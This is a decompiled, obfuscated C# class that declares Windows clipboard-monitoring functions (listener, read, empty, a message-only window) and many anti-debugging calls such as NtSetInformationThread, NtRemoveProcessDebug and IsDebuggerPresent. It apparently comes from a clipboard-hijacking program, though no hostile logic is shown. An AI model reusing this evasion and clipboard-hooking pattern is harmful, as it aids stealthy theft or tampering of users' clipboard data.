using System;
using System.Runtime.InteropServices;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000020 RID: 32
	internal class Class_22
	{
		// Token: 0x06000078 RID: 120
		[DllImport("user32.dll", EntryPoint = "GetClipboardData")]
		internal static extern IntPtr kmethod_47(uint arg_0);

		// Token: 0x06000079 RID: 121
		[DllImport("user32.dll", EntryPoint = "IsClipboardFormatAvailable")]
		public static extern bool lmethod_48(uint arg_0);

		// Token: 0x0600007A RID: 122
		[DllImport("user32.dll", EntryPoint = "OpenClipboard", SetLastError = true)]
		internal static extern bool pmethod_49(IntPtr arg_0);

		// Token: 0x0600007B RID: 123
		[DllImport("user32.dll", EntryPoint = "CloseClipboard", SetLastError = true)]
		internal static extern bool smethod_50();

		// Token: 0x0600007C RID: 124
		[DllImport("user32.dll", EntryPoint = "EmptyClipboard")]
		internal static extern bool xmethod_51();

		// Token: 0x0600007D RID: 125
		[DllImport("kernel32.dll", EntryPoint = "GlobalLock")]
		internal static extern IntPtr tmethod_52(IntPtr arg_0);

		// Token: 0x0600007E RID: 126
		[DllImport("kernel32.dll", EntryPoint = "GlobalUnlock")]
		internal static extern bool gmethod_53(IntPtr arg_0);

		// Token: 0x0600007F RID: 127
		[DllImport("user32.dll", EntryPoint = "AddClipboardFormatListener", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool cmethod_54(IntPtr arg_0);

		// Token: 0x06000080 RID: 128
		[DllImport("user32.dll", EntryPoint = "SetParent", SetLastError = true)]
		public static extern IntPtr vmethod_55(IntPtr arg_0, IntPtr arg_1);

		// Token: 0x06000081 RID: 129
		[DllImport("kernel32.dll", EntryPoint = "GetModuleHandle")]
		public static extern IntPtr dmethod_56(string str_0);

		// Token: 0x06000082 RID: 130
		[DllImport("ntdll.dll", EntryPoint = "NtSetInformationThread")]
		public static extern Class_59 kmethod_57(IntPtr arg_0, Class_118 arg_1, IntPtr arg_2, int sayıInt_0);

		// Token: 0x06000083 RID: 131
		[DllImport("kernel32.dll", EntryPoint = "OpenThread")]
		public static extern IntPtr lmethod_58(Class_119 arg_0, bool bool_0, uint arg_1);

		// Token: 0x06000084 RID: 132
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, EntryPoint = "CloseHandle", SetLastError = true)]
		public static extern bool pmethod_59(IntPtr arg_0);

		// Token: 0x06000085 RID: 133
		[DllImport("ntdll.dll", EntryPoint = "NtQueryInformationProcess", ExactSpelling = true, SetLastError = true)]
		public static extern Class_59 smethod_60([In] IntPtr arg_0, [In] Class_115 arg_1, out IntPtr arg_2, [In] int sayıInt_0, [Optional] out int arg_3);

		// Token: 0x06000086 RID: 134
		[DllImport("ntdll.dll", EntryPoint = "NtClose", ExactSpelling = true, SetLastError = true)]
		public static extern Class_59 xmethod_61([In] IntPtr arg_0);

		// Token: 0x06000087 RID: 135
		[DllImport("ntdll.dll", EntryPoint = "NtRemoveProcessDebug", ExactSpelling = true, SetLastError = true)]
		public static extern Class_59 tmethod_62(IntPtr arg_0, IntPtr arg_1);

		// Token: 0x06000088 RID: 136
		[DllImport("ntdll.dll", EntryPoint = "NtSetInformationDebugObject", ExactSpelling = true, SetLastError = true)]
		public static extern Class_59 gmethod_63([In] IntPtr arg_0, [In] Class_116 arg_1, [In] IntPtr arg_2, [In] int sayıInt_0, [Optional] out int arg_3);

		// Token: 0x06000089 RID: 137
		[DllImport("ntdll.dll", EntryPoint = "NtQuerySystemInformation", ExactSpelling = true, SetLastError = true)]
		public static extern Class_59 cmethod_64([In] Class_117 arg_0, IntPtr arg_1, [In] int sayıInt_0, [Optional] out int arg_2);

		// Token: 0x0600008A RID: 138
		[DllImport("kernel32.dll", EntryPoint = "CheckRemoteDebuggerPresent", ExactSpelling = true, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool vmethod_65(IntPtr arg_0, [MarshalAs(UnmanagedType.Bool)] ref bool arg_1);

		// Token: 0x0600008B RID: 139
		[DllImport("kernel32.dll", EntryPoint = "IsDebuggerPresent", ExactSpelling = true, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool dmethod_66();

		// Token: 0x0600008C RID: 140
		[DllImport("kernel32.dll", EntryPoint = "SetThreadExecutionState", SetLastError = true)]
		public static extern Class_60 kmethod_67(Class_60 arg_0);

		// Token: 0x04000055 RID: 85
		public const int field_0 = 797;

		// Token: 0x04000056 RID: 86
		public static IntPtr field_1 = new IntPtr(-3);
	}
}
